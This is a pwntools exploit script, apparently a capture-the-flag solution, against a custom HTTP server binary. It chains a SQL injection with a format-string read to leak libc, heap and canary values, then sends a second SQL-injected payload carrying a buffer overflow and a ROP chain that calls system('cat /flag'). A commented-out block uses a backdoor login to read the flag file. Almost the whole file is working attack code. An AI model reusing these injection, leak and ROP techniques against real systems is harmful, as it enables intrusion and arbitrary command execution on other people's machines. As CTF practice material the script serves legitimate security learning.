from pwn import *

def main(host,port=20508):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./server_strip")
		# gdb.attach(p,"b *0x000000000401FE9")
	# use backdoor to get flag
	# r = remote("127.0.0.1",8080)
	# payload = '''GET /login.html?username=admin&password=admin111111111111111111111111111111111111111111111111111111nimda&menu=parsefile&para=/flag HTTP/1.1
	# Credentials: LG GRAM
	# '''
	# r.send(payload)
	# print r.recvrepeat()
	
	# use string format attack
	# leak
	sleep(3)
	r = remote("127.0.0.1",8080)
	payload = '''POST /cart.html?cargo=1); HTTP/1.1	\r
	Host: 127.0.0.1\r\n\r\n
	A=B&cargo=1) union select "777%4$p-%7$p-%41$p+";#'''
	r.send(payload)
	r.recvuntil("777")
	libc.address = int(r.recvuntil('-',drop=True),16)-0x3c5258
	info("libc : " + hex(libc.address))
	heap = int(r.recvuntil('-',drop=True),16)
	info("heap : " + hex(heap))
	canary = int(r.recvuntil('+',drop=True),16)
	info("canary : " + hex(canary))
	r.close()
	
	
	# gdb.attach(p,"b *0x00000000040230B")
	# pause()
	r = remote("127.0.0.1",8080)
	payload = '''POST /product.html? HTTP/1.1\r
	Host: 127.0.0.1\r\n\r\n'''
	payload += 'a=b&id=777 union select '
	payload += '"overdue'+'A'*104
	p_rdi = 0x0000000000403823
	rop = p64(p_rdi)+p64(heap+0x3acbc)+p64(libc.symbols['system'])
	payload += '","1111111",%s,"cat /flag"'%("concat('',x'%s')"%(p64(canary).encode('hex')+'41'*0x18+rop.encode('hex')))
	# 0x0000000000403823 : pop rdi ; ret
	r.send(payload)
	print r.recvrepeat()
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	main(args["REMOTE"])